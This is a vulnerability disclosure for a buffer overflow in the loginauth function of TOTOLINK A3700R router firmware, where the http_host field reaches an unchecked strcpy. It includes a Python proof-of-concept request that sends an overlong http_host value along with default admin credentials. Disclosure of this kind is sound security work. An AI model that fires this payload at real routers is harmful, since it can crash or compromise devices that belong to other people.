## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/data/upload/20200728/311b3ec5b0a8e61af298aebda158ec9b.zip

## Affected version

A3700R V9.1.2u.5822_B20200513

## Vulnerability details

In the A3700R V9.1.2u.5822_B20200513 firmware has a buffer overflow vulnerability in the `loginauth` function. The `v8` variable receives the `http_host` parameter from a POST request. However, since the user can control the input of `http_host`, the statement `strcpy(v26, v8);` can cause a buffer overflow injection vulnerability.

![image-20240719101917489](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101917489.png)

![image-20240719101821295](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101821295.png)

![image-20240719101834445](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101834445.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"username":"admin","password":"admin","http_host":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","verify":"0","flag":"0","topicurl":"loginAuth"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719101631080](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101631080.png)
